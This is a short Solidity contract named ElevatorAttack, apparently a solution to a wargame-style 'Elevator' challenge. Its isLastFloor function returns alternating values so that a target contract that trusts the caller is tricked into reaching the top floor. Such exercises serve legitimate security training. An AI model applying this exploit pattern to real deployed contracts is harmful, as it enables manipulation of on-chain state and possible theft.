// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract ElevatorAttack {
    bool public toggle=true;
    Elevator public target;
    
    constructor(address _target)public {
        target= Elevator(_target);
    }

    function isLastFloor(uint) public returns(bool){
        toggle=!toggle;
        return toggle;
    }

    function setTop(uint _floor)public{
        target.goTo(_floor);
    }

}
